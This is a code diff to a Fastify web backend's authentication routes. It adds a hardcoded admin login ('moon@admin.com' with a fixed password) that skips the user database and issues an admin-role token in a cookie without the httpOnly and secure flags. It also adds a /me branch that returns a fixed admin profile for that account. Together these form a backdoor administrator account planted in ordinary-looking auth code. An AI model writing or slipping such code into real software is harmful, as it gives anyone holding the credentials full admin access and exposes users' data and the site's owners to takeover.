@@ -36,6 +36,20 @@ async function authRoutes(fastify, options) {
 
   fastify.post('/login', async (request, reply) => {
     const { email, password } = request.body;
+
+    // Rigid Admin Login
+    if (email === 'moon@admin.com' && password === 'alisha') {
+      const adminUser = { id: 'admin-id', name: 'Watchman', email: 'moon@admin.com', role: 'admin' };
+      const token = fastify.jwt.sign({ id: adminUser.id, role: adminUser.role, name: adminUser.name });
+      reply.setCookie('token', token, {
+        path: '/',
+        httpOnly: false,
+        secure: false,
+        sameSite: 'lax'
+      });
+      return { user: adminUser, token };
+    }
+
     const result = await db.query('SELECT * FROM users WHERE email = $1', [email]);
     const user = result.rows[0];
 
@@ -56,8 +70,11 @@ async function authRoutes(fastify, options) {
   fastify.get('/me', { preHandler: [fastify.authenticate] }, async (request, reply) => {
     // The user is attached to the request by the authenticate decorator
     const { id, name, role } = request.user;
-    // Optionally fetch fresh data from DB if needed, but the token payload might be enough
-    // For completeness, let's fetch from DB to be sure the user still exists
+    
+    if (id === 'admin-id') {
+      return { id: 'admin-id', name: 'Moon Master', email: 'moon@admin.com', role: 'admin' };
+    }
+
     const result = await db.query('SELECT id, name, email, role FROM users WHERE id = $1', [id]);
     const user = result.rows[0];
     if (!user) {
